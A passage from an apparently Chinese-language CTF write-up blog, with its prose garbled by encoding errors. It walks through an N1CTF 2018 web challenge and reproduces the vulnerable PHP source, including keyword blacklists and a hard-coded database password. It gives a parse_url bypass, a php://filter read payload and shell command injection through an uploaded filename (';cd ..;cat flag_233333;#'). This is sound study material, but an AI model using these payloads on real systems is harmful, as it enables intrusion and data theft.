class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Hacker</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Location: hacker.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter_directory</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$keywords</span> = [<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;manage&quot;</span>,<span class="string">&quot;ffffllllaaaaggg&quot;</span>];</span><br><span class="line">    <span class="variable">$uri</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_URI&quot;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">parse_str</span>(<span class="variable">$uri</span>[<span class="string">&#x27;query&#x27;</span>], <span class="variable">$query</span>);</span><br><span class="line"><span class="comment">//    var_dump($query);</span></span><br><span class="line"><span class="comment">//    die();</span></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$keywords</span> <span class="keyword">as</span> <span class="variable">$token</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$query</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">stristr</span>(<span class="variable">$k</span>, <span class="variable">$token</span>))</span><br><span class="line">                <span class="title function_ invoke__">hacker</span>();</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">stristr</span>(<span class="variable">$v</span>, <span class="variable">$token</span>))</span><br><span class="line">                <span class="title function_ invoke__">hacker</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter_directory_guest</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$keywords</span> = [<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;manage&quot;</span>,<span class="string">&quot;ffffllllaaaaggg&quot;</span>,<span class="string">&quot;info&quot;</span>];</span><br><span class="line">    <span class="variable">$uri</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_URI&quot;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">parse_str</span>(<span class="variable">$uri</span>[<span class="string">&#x27;query&#x27;</span>], <span class="variable">$query</span>);</span><br><span class="line"><span class="comment">//    var_dump($query);</span></span><br><span class="line"><span class="comment">//    die();</span></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$keywords</span> <span class="keyword">as</span> <span class="variable">$token</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$query</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">stristr</span>(<span class="variable">$k</span>, <span class="variable">$token</span>))</span><br><span class="line">                <span class="title function_ invoke__">hacker</span>();</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">stristr</span>(<span class="variable">$v</span>, <span class="variable">$token</span>))</span><br><span class="line">                <span class="title function_ invoke__">hacker</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Filter</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$mysqli</span>;</span><br><span class="line">    <span class="variable">$blacklist</span> = <span class="string">&quot;information|benchmark|order|limit|join|file|into|execute|column|extractvalue|floor|update|insert|delete|username|password&quot;</span>;</span><br><span class="line">    <span class="variable">$whitelist</span> = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;(),_*`-@=+&gt;&lt;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$string</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="string">&quot;<span class="subst">$whitelist</span>&quot;</span>, <span class="variable">$string</span>[<span class="variable">$i</span>]) === <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">Hacker</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/<span class="subst">$blacklist</span>/is&quot;</span>, <span class="variable">$string</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">Hacker</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$string</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">real_escape_string</span>(<span class="variable">$string</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sql_query</span>(<span class="params"><span class="variable">$sql_query</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$mysqli</span>;</span><br><span class="line">    <span class="variable">$res</span> = <span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql_query</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$user</span>, <span class="variable">$pass</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">Filter</span>(<span class="variable">$user</span>);</span><br><span class="line">    <span class="variable">$pass</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$pass</span>);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;select * from `albert_users` where `username_which_you_do_not_know`= &#x27;<span class="subst">$user</span>&#x27; and `password_which_you_do_not_know_too` = &#x27;<span class="subst">$pass</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$sql</span>;</span><br><span class="line">    <span class="variable">$res</span> = <span class="title function_ invoke__">sql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="comment">//    var_dump($res);</span></span><br><span class="line"><span class="comment">//    die();</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$res</span>-&gt;num_rows) &#123;</span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$res</span>-&gt;<span class="title function_ invoke__">fetch_array</span>();</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] = <span class="variable">$data</span>[username_which_you_do_not_know];</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;isadmin&#x27;</span>] = <span class="variable">$data</span>[isadmin_which_you_do_not_know_too_too];</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">updateadmin</span>(<span class="params"><span class="variable">$level</span>,<span class="variable">$user</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;update `albert_users` set `isadmin_which_you_do_not_know_too_too` = &#x27;<span class="subst">$level</span>&#x27; where `username_which_you_do_not_know`=&#x27;<span class="subst">$user</span>&#x27; &quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$sql</span>;</span><br><span class="line">    <span class="variable">$res</span> = <span class="title function_ invoke__">sql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="comment">//    var_dump($res);</span></span><br><span class="line"><span class="comment">//    die();</span></span><br><span class="line"><span class="comment">//    die($res);</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$res</span> == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">register</span>(<span class="params"><span class="variable">$user</span>, <span class="variable">$pass</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$mysqli</span>;</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">Filter</span>(<span class="variable">$user</span>);</span><br><span class="line">    <span class="variable">$pass</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$pass</span>);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;insert into `albert_users`(`username_which_you_do_not_know`,`password_which_you_do_not_know_too`,`isadmin_which_you_do_not_know_too_too`) VALUES (&#x27;<span class="subst">$user</span>&#x27;,&#x27;<span class="subst">$pass</span>&#x27;,&#x27;0&#x27;)&quot;</span>;</span><br><span class="line">    <span class="variable">$res</span> = <span class="title function_ invoke__">sql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$mysqli</span>-&gt;insert_id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">logout</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">session_destroy</span>();</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Location: index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>config.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ERROR | E_WARNING | E_PARSE);</span><br><span class="line"><span class="title function_ invoke__">define</span>(BASEDIR, <span class="string">&quot;/var/www/html/&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(FLAG_SIG, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$OPERATE</span> = <span class="keyword">array</span>(<span class="string">&#x27;userinfo&#x27;</span>,<span class="string">&#x27;upload&#x27;</span>,<span class="string">&#x27;search&#x27;</span>);</span><br><span class="line"><span class="variable">$OPERATE_admin</span> = <span class="keyword">array</span>(<span class="string">&#x27;userinfo&#x27;</span>,<span class="string">&#x27;upload&#x27;</span>,<span class="string">&#x27;search&#x27;</span>,<span class="string">&#x27;manage&#x27;</span>);</span><br><span class="line"><span class="variable">$DBHOST</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$DBUSER</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$DBPASS</span> = <span class="string">&quot;Nu1LCTF2018!@#qwe&quot;</span>;</span><br><span class="line"><span class="comment">//$DBPASS = &quot;&quot;;</span></span><br><span class="line"><span class="variable">$DBNAME</span> = <span class="string">&quot;N1CTF&quot;</span>;</span><br><span class="line"><span class="variable">$mysqli</span> = @<span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$DBHOST</span>, <span class="variable">$DBUSER</span>, <span class="variable">$DBPASS</span>, <span class="variable">$DBNAME</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_connect_errno</span>())&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no sql connection&quot;</span>.<span class="title function_ invoke__">mysqli_connect_error</span>();</span><br><span class="line">        <span class="variable">$mysqli</span>=<span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä»£ç å®¡è®¡ä¸€ä¸‹æ²¡å‘ç°ä»€ä¹ˆä¸å¯¹çš„ æˆ‘ä»¥ä¸ºæ˜¯sqlæ³¨å…¥</p>
<p>ä½†æ˜¯çœ‹äº†wp å‘ç°æ˜¯æˆ‘æ²¡å­¦åˆ°çš„çŸ¥è¯†ç‚¹</p>
<p>å…¶ä»–æ–‡ä»¶æ²¡æœ‰ä»€ä¹ˆ ç›´æ¥æ¥çœ‹é‡è¦çš„function.php</p>
<p>å®šä½åˆ°ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter_directory_guest</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$keywords</span> = [<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;manage&quot;</span>,<span class="string">&quot;ffffllllaaaaggg&quot;</span>,<span class="string">&quot;info&quot;</span>];</span><br><span class="line">    <span class="variable">$uri</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_URI&quot;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">parse_str</span>(<span class="variable">$uri</span>[<span class="string">&#x27;query&#x27;</span>], <span class="variable">$query</span>);</span><br><span class="line"><span class="comment">//    var_dump($query);</span></span><br><span class="line"><span class="comment">//    die();</span></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$keywords</span> <span class="keyword">as</span> <span class="variable">$token</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$query</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">stristr</span>(<span class="variable">$k</span>, <span class="variable">$token</span>))</span><br><span class="line">                <span class="title function_ invoke__">hacker</span>();</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">stristr</span>(<span class="variable">$v</span>, <span class="variable">$token</span>))</span><br><span class="line">                <span class="title function_ invoke__">hacker</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å‘ç°å­˜åœ¨parse_urlè§£ææ¼æ´</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689742999096-b318c342-ce4a-475b-a82b-479e913e7f0b.png" alt="img"></p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689743053375-32586548-cdef-45ab-9fd0-9d420a14c6b5.png" alt="img"></p>
<p>å¯ä»¥å€ŸåŠ©ä¸€ä¸ªdemoæ¥ç†è§£</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689743421112-e924c505-196c-450c-8811-58f86831aa55.png" alt="img"></p>
<p> parse_url()ä¼šæŠŠ<code>//</code>è®¤ä¸ºæ˜¯ç›¸å¯¹è·¯å¾„ </p>
<p>äºæ˜¯å½“æˆ‘ä»¬åœ¨è·¯å¾„å‰å¤šè¾“å…¥ä¸€ä¸ª/ï¼Œä¼šä½¿è¿™ä¸ªå‡½æ•°å¤±æ•ˆï¼Œè¿™æ ·å°±ç»•è¿‡äº†æ£€æµ‹  </p>
<p>å¦‚æœæˆ‘ä»¬ç›´æ¥è¾“å…¥<code>/user.php?page=php://filter/read=convert.base64-encode/resource=ffffllllaaaaggg</code>ä¼šè¢«æ£€æµ‹</p>
<p>ä½†æ˜¯åœ¨å‰é¢å¤šåŠ ä¸€ä¸ª<code>/</code>æˆåŠŸè¯»åˆ°äº†æºç </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//user.php?page=php://filter/read=convert.base64-encode/resource=ffffllllaaaaggg</span><br><span class="line">&lt;?php</span><br><span class="line">if (FLAG_SIG != 1)&#123;</span><br><span class="line">    die(&quot;you can not visit it directly&quot;);</span><br><span class="line">&#125;else &#123;</span><br><span class="line">    echo &quot;you can find sth in m4aaannngggeee&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>åˆ©ç”¨ä¼ªåè®®è¯»æºç  </p>
<p>ç„¶åå¾—åˆ°</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (FLAG_SIG != <span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;you can not visit it directly&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;templates/upload.html&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è®¿é—®<code>/templates/upload.html</code></p>
<p>ä½†æ˜¯æ˜¯ä¸ªå‡çš„ä¸Šä¼ ç‚¹</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689742013537-59d3d70f-8100-4372-a4d1-ffb424e4e727.png" alt="img"></p>
<p>éšä¾¿ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ä¹‹åä¼šæŠ¥é”™å¹¶ä¸”å‘ç°å­˜åœ¨<code>/upllloadddd.php</code></p>
<p>ç„¶ååˆ©ç”¨å‰é¢çš„ä¼ªåè®®è·å–æºç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$allowtype</span> = <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>,<span class="string">&quot;png&quot;</span>,<span class="string">&quot;jpg&quot;</span>);</span><br><span class="line"><span class="variable">$size</span> = <span class="number">10000000</span>;</span><br><span class="line"><span class="variable">$path</span> = <span class="string">&quot;./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&quot;</span>;</span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>],<span class="variable">$path</span>.<span class="variable">$filename</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error:can not move&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;error:not an upload fileï¼&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$newfile</span> = <span class="variable">$path</span>.<span class="variable">$filename</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;file upload success&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$filename</span>;</span><br><span class="line"><span class="variable">$picdata</span> = <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&quot;</span>.<span class="variable">$filename</span>.<span class="string">&quot; | base64 -w 0&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;data:image/png;base64,&quot;</span>.<span class="variable">$picdata</span>.<span class="string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>]&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="variable">$newfile</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Upload file error: &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ext</span> = <span class="title function_ invoke__">array_pop</span>(<span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>,<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>,<span class="variable">$allowtype</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="variable">$newfile</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ç›´æ¥å®šä½åˆ°è¿™ä¸€è¡Œä»£ç </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$picdata = system(&quot;cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&quot;.$filename.&quot; | base64 -w 0&quot;);</span><br></pre></td></tr></table></figure>

<p>å‘ç°å­˜åœ¨æ–‡ä»¶ä¸Šä¼ åæ¼æ´ å¯ä»¥ä¿®æ”¹æ–‡ä»¶åé—­åˆå‘½ä»¤æ‰§è¡Œ</p>
<p>ä½†æ˜¯çœŸæ­£çš„ä¸Šä¼ ç‚¹åœ¨å“ªå‘¢ çœ‹äº†wp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/user.php?page=m4aaannngggeee</span><br></pre></td></tr></table></figure>

<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689742213512-efa5426d-7232-415f-bca5-7372374dc56a.png" alt="img"></p>
<p>ç”±äºä¸èƒ½è®©move_uploaded_fileæŠ¥é”™ï¼Œæ–‡ä»¶åé‡Œä¸èƒ½æœ‰/è¿™ç§è·¯å¾„å­—ç¬¦  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_">is_uploaded_file</span>($_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_">move_uploaded_file</span>($_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>],$path.<span class="property">$filename</span>))&#123;</span><br><span class="line">        <span class="title function_">die</span>(<span class="string">&quot;error:can not move&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥å¦‚æœæˆ‘ä»¬æ‰§è¡Œå‘½ä»¤ <code>ls /</code>è¿™æ · é‚£ä¹ˆå°±ä¼šdieå‡ºå» æ²¡æœ‰å›æ˜¾ éš¾æ€ªæˆ‘ä¸€å¼€å§‹ä¸€ç›´åœ¨è¿™é‡Œå›°æƒ‘ </p>
<p>ç¿»åˆ«äººçš„åšå®¢çœ‹wpçœŸæ˜¯ä¸€ä»¶ç¾äº‹å•Š:)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;cd ..;ls;#</span><br></pre></td></tr></table></figure>

<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689741475222-474413c2-512d-4fdc-9496-c77c237cf241.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;cd ..;cat flag_233333;#</span><br></pre></td></tr></table></figure>

<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689741512376-6e560d1f-9068-48c5-a07b-73a7ed625bb8.png" alt="img"></p>
<h1 id="118ã€-å¼ºç½‘æ¯-2019-Upload"><a href="#118ã€-å¼ºç½‘æ¯-2019-Upload" class="headerlink" title="118ã€[å¼ºç½‘æ¯ 2019]Upload"></a>118ã€[å¼ºç½‘æ¯ 2019]Upload</h1><p>åˆè¦ä»£ç å®¡è®¡å…ˆç•™ç€</p>
<h1 id="119ã€-GYCTF2020-Ez-Express"><a href="#119ã€-GYCTF2020-Ez-Express" class="headerlink" title="119ã€[GYCTF2020]Ez_Express"></a>119ã€[GYCTF2020]Ez_Express</h1><p>ä¸€é“jsçš„åŸå‹é“¾æ±¡æŸ“+sstiçš„ç»„åˆé¢˜ç›® æŒºä¸é”™çš„</p>
<p>é¦–å…ˆè®¿é—®ä¸»é¡µ ä»–è®©æˆ‘ä»¬ç”¨ADMIN ç™»å½• ç„¶åå­˜åœ¨ä¸€ä¸ªæºç æ³„éœ² </p>
<p><code>/www.zip</code>ä¸‹åˆ°æºç </p>
<p>æ”¾ä¸€ä¸‹é‡è¦çš„æºç ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span 